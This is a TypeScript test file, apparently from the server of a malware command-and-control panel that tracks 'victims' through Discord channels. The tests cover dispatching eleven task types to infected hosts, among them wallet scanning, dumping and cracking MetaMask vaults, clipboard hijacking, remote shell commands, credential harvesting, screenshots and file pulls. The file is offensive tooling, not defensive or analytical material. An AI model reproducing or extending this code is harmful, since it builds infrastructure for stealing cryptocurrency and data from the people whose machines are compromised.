import { test } from 'node:test';
import assert from 'node:assert/strict';
import { taskLinkError } from '../server/lib/tasks';
import { transportOf, validateParams } from '../server/lib/task-schemas';

const victim = (id: string, channelId?: string, missing = false) => ({
  id,
  hostname: `host-${id}`,
  discord: channelId ? { channelId, missingAt: missing ? new Date() : null } : null
});

test('a live link dispatches', () => {
  assert.equal(taskLinkError([victim('a', '111')], new Set()), null);
});

test('a victim without a link is rejected', () => {
  const error = taskLinkError([victim('a')], new Set());
  assert.equal(error?.code, 'discord_unlinked');
  assert.deepEqual(error?.victim_ids, ['a']);
});

test('an ignored channel is treated as unlinked even if the link row exists', () => {
  const error = taskLinkError([victim('a', '111')], new Set(['111']));
  assert.equal(error?.code, 'discord_unlinked');
});

test('a missing channel needs a recreate or re-link', () => {
  const error = taskLinkError([victim('a', '111', true)], new Set());
  assert.equal(error?.code, 'discord_channel_missing');
});

test('unlinked wins over missing when both are present', () => {
  const error = taskLinkError([victim('a', '111', true), victim('b')], new Set(['111']));
  assert.equal(error?.code, 'discord_unlinked');
  assert.deepEqual(error?.victim_ids, ['a', 'b']);
});

test('the eleven task types validate at the edge', () => {
  const samples: Record<string, Record<string, unknown>> = {
    scan_wallets: {},
    dump_vault: { target: 'metamask' },
    crack_vault: { target: 'metamask' },
    clip_start: {},
    clip_stop: {},
    shell: { command: 'whoami' },
    harvest: {},
    screenshot: {},
    file_pull: { path: '/tmp/a' },
    cancel: { task_id: '9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60' },
    agent: { command: 'ping' }
  };
  assert.equal(Object.keys(samples).length, 11);
  for (const [name, params] of Object.entries(samples)) {
    assert.equal(validateParams(name, params), null, name);
    assert.ok(transportOf(name) === 'http' || transportOf(name) === 'frame', name);
  }
});

test('max_bytes outside 1 MiB..512 MiB is rejected', () => {
  assert.equal(validateParams('scan_wallets', { max_bytes: 1_048_576 }), null);
  assert.equal(validateParams('scan_wallets', { max_bytes: 536_870_912 }), null);
  assert.equal(validateParams('scan_wallets', { max_bytes: 1_048_575 }), 'invalid_param: max_bytes (1048576..536870912)');
  assert.equal(validateParams('scan_wallets', { max_bytes: 536_870_913 }), 'invalid_param: max_bytes (1048576..536870912)');
});

test('http_only names carry the http transport', () => {
  for (const name of ['scan_wallets', 'dump_vault', 'crack_vault', 'shell', 'agent']) {
    assert.equal(transportOf(name), 'http');
  }
  for (const name of ['clip_start', 'clip_stop', 'harvest', 'screenshot', 'file_pull', 'cancel']) {
    assert.equal(transportOf(name), 'frame');
  }
});
